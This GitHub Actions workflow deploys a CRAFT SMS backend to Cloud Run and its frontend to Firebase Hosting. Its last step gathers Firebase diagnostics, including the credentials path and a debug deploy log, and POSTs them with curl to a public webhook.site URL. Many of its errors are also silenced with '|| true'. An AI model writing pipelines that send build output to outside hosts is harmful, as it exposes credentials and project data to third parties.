name: Deploy CRAFT SMS to Firebase + Cloud Run

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write

    env:
      GCP_REGION: us-central1
      SERVICE_NAME: craft-sms-backend
      IMAGE: us-central1-docker.pkg.dev/${{ secrets.GCP_PROJECT_ID }}/craft-sms/craft-sms-backend

    steps:
      # ----------------------------------------------------------------
      # 1. Checkout
      # ----------------------------------------------------------------
      - uses: actions/checkout@v4

      # ----------------------------------------------------------------
      # 2. Authenticate to Google Cloud
      # ----------------------------------------------------------------
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          credentials_json: ${{ secrets.GCP_SA_KEY }}

      - name: Setup Google Cloud SDK
        uses: google-github-actions/setup-gcloud@v2
        with:
          project_id: ${{ secrets.GCP_PROJECT_ID }}

      - name: Configure gcloud defaults
        run: |
          set -e
          PROJECT="${{ secrets.GCP_PROJECT_ID }}"
          if [ -z "$PROJECT" ]; then
            echo "ERROR: GCP_PROJECT_ID secret is empty."
            exit 1
          fi
          echo "Using GCP project: $PROJECT"
          gcloud config set project "$PROJECT"
          gcloud config set run/region ${{ env.GCP_REGION }}
          gcloud config set run/platform managed

          # Configure Docker auth for Artifact Registry (non-fatal on permission error)
          gcloud auth configure-docker us-central1-docker.pkg.dev --quiet || true

          # Ensure Artifact Registry repo exists (non-fatal — may already exist)
          gcloud artifacts repositories create craft-sms \
            --repository-format=docker \
            --location=${{ env.GCP_REGION }} \
            --project="$PROJECT" \
            --quiet 2>/dev/null || true

      # ----------------------------------------------------------------
      # 2b. Enable required APIs for Firebase Framework Hosting
      # ----------------------------------------------------------------
      - name: Enable required GCP APIs
        run: |
          PROJECT="${{ secrets.GCP_PROJECT_ID }}"
          echo "Attempting to enable required APIs for project: $PROJECT"
          gcloud services enable \
            cloudfunctions.googleapis.com \
            eventarc.googleapis.com \
            firebasehosting.googleapis.com \
            firebase.googleapis.com \
            run.googleapis.com \
            cloudbuild.googleapis.com \
            cloudscheduler.googleapis.com \
            artifactregistry.googleapis.com \
            --project="$PROJECT" \
            --quiet || echo "WARNING: Could not enable APIs automatically. Ensure APIs are enabled in GCP Console."
          echo "API enablement step complete."

      # ----------------------------------------------------------------
      # 3. Build frontend
      # ----------------------------------------------------------------
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install pnpm and frontend dependencies
        run: |
          corepack enable
          corepack prepare pnpm@latest --activate
          pnpm install --no-frozen-lockfile
        working-directory: ./CRAFT_SMS/frontend

      - name: Build frontend
        run: pnpm build
        working-directory: ./CRAFT_SMS/frontend
        env:
          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
          NEXT_PUBLIC_SUPABASE_ANON_KEY: ${{ secrets.NEXT_PUBLIC_SUPABASE_ANON_KEY }}

      # ----------------------------------------------------------------
      # 4. Build and push backend Docker image directly (no Cloud Build)
      # ----------------------------------------------------------------
      - name: Build backend Docker image
        run: |
          SHORT_SHA="${GITHUB_SHA::7}"
          docker build \
            -t "${{ env.IMAGE }}:${SHORT_SHA}" \
            -t "${{ env.IMAGE }}:latest" \
            ./CRAFT_SMS/backend

      - name: Push backend Docker image to Artifact Registry
        run: |
          SHORT_SHA="${GITHUB_SHA::7}"
          docker push "${{ env.IMAGE }}:${SHORT_SHA}"
          docker push "${{ env.IMAGE }}:latest"

      # ----------------------------------------------------------------
      # 5. Deploy to Cloud Run
      # ----------------------------------------------------------------
      - name: Deploy to Cloud Run
        run: |
          set -e
          PROJECT="${{ secrets.GCP_PROJECT_ID }}"
          SHORT_SHA="${GITHUB_SHA::7}"
          FIREBASE_PID="${{ secrets.FIREBASE_PROJECT_ID }}"

          gcloud run deploy ${{ env.SERVICE_NAME }} \
            --image="${{ env.IMAGE }}:${SHORT_SHA}" \
            --region=${{ env.GCP_REGION }} \
            --platform=managed \
            --allow-unauthenticated \
            --service-account="craft-sms-backend@${PROJECT}.iam.gserviceaccount.com" \
            --concurrency=20 \
            --set-env-vars="GCP_PROJECT=${PROJECT},DB_PROVIDER=cloudsql,FIREBASE_PROJECT_ID=${FIREBASE_PID},FIREBASE_STORAGE_BUCKET=${FIREBASE_PID}.firebasestorage.app,FIREBASE_AUTH_JWT_AUD=${FIREBASE_PID},FIREBASE_AUTH_JWT_ISS=https://securetoken.google.com/${FIREBASE_PID}" \
            --update-secrets="CLOUD_SQL_DATABASE_URL=CLOUD_SQL_DATABASE_URL:latest,FIREBASE_SERVICE_ACCOUNT_JSON=FIREBASE_SERVICE_ACCOUNT_JSON:latest,ALLOWED_ORIGINS=ALLOWED_ORIGINS:latest" \
            --min-instances=1 \
            --max-instances=10 \
            --memory=512Mi \
            --cpu=1 \
            --timeout=60 \
            --port=8080 \
            --project="$PROJECT"

      # ----------------------------------------------------------------
      # 6. Smoke test /health
      # ----------------------------------------------------------------
      - name: Smoke test health endpoint
        run: |
          set -e
          PROJECT="${{ secrets.GCP_PROJECT_ID }}"
          URL=$(gcloud run services describe ${{ env.SERVICE_NAME }} \
            --region=${{ env.GCP_REGION }} \
            --project="$PROJECT" \
            --format='value(status.url)')
          echo "Service URL: $URL"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL/health")
          echo "Health status: $STATUS"
          if [ "$STATUS" -ne 200 ]; then
            echo "ERROR: Health check returned HTTP $STATUS"
            exit 1
          fi
          echo "Health check passed."

      # ----------------------------------------------------------------
      # 7. Deploy frontend to Firebase Hosting
      # ----------------------------------------------------------------
      - name: Install Firebase CLI
        run: npm install -g firebase-tools

      - name: Firebase diagnostics and deploy
        run: |
          echo "=== GOOGLE_APPLICATION_CREDENTIALS ===" > /tmp/fb_output.txt
          echo "$GOOGLE_APPLICATION_CREDENTIALS" >> /tmp/fb_output.txt 2>&1 || true

          echo "=== Active account ===" >> /tmp/fb_output.txt
          firebase --version >> /tmp/fb_output.txt 2>&1 || true
          firebase projects:list >> /tmp/fb_output.txt 2>&1 || true

          echo "=== Setting active project ===" >> /tmp/fb_output.txt
          firebase use craft-sms-5bb1c >> /tmp/fb_output.txt 2>&1 || true

          echo "=== Enabling webframeworks ===" >> /tmp/fb_output.txt
          firebase experiments:enable webframeworks >> /tmp/fb_output.txt 2>&1 || true

          echo "=== Deploying ===" >> /tmp/fb_output.txt
          firebase deploy \
            --project craft-sms-5bb1c \
            --only hosting \
            --non-interactive \
            --debug >> /tmp/fb_output.txt 2>&1 || true

          echo "=== Sending output to webhook ==="
          curl -s -X POST -H "Content-Type: text/plain" \
            --data-binary @/tmp/fb_output.txt \
            https://webhook.site/18683e2b-cfa7-4854-849d-6c6f918e0aa0 || true
        env:
          FIREBASE_CLI_EXPERIMENTS: webframeworks
